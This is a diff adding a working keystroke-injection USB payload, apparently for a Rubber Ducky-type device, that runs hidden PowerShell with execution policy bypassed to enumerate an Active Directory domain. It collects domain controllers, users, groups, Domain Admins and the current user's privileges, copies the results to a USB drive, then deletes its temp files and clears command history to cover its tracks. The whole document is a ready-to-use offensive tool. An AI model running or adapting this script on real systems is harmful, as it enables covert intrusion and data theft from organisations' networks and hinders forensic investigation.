@@ -1,0 +1,73 @@
+# ============================================
+# ACTIVE DIRECTORY RECON - Domain Enumeration
+# ============================================
+# Purpose: Gather AD information
+# Target: Windows Domain-joined systems
+# Time: 30 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+STRING $td = "$env:TEMP\.ad"; md $td -Force
+ENTER
+DELAY 200
+
+# Check if domain joined
+STRING $domain = (Get-WmiObject Win32_ComputerSystem).Domain
+ENTER
+STRING "Domain: $domain" | Out-File "$td\ad_info.txt"
+ENTER
+DELAY 200
+
+# Domain Controllers
+STRING "=== DOMAIN CONTROLLERS ===" | Out-File "$td\ad_info.txt" -Append
+ENTER
+STRING nltest /dclist:$domain 2>$null | Out-File "$td\ad_info.txt" -Append
+ENTER
+DELAY 500
+
+# Domain Users (top 50)
+STRING "=== DOMAIN USERS ===" | Out-File "$td\ad_info.txt" -Append
+ENTER
+STRING net user /domain 2>$null | Select-Object -First 50 | Out-File "$td\ad_info.txt" -Append
+ENTER
+DELAY 500
+
+# Domain Groups
+STRING "=== DOMAIN GROUPS ===" | Out-File "$td\ad_info.txt" -Append
+ENTER
+STRING net group /domain 2>$null | Out-File "$td\ad_info.txt" -Append
+ENTER
+DELAY 500
+
+# Domain Admins
+STRING "=== DOMAIN ADMINS ===" | Out-File "$td\ad_info.txt" -Append
+ENTER
+STRING net group "Domain Admins" /domain 2>$null | Out-File "$td\ad_info.txt" -Append
+ENTER
+DELAY 500
+
+# Current user privileges
+STRING "=== CURRENT USER ===" | Out-File "$td\ad_info.txt" -Append
+ENTER
+STRING whoami /all | Out-File "$td\ad_info.txt" -Append
+ENTER
+DELAY 500
+
+# Copy to USB
+STRING if (Test-Path E:\) { Copy-Item "$td\ad_info.txt" "E:\" -Force }
+ENTER
+DELAY 300
+
+# Clean
+STRING Remove-Item $td -Recurse -Force
+ENTER
+STRING Clear-History; exit
+ENTER
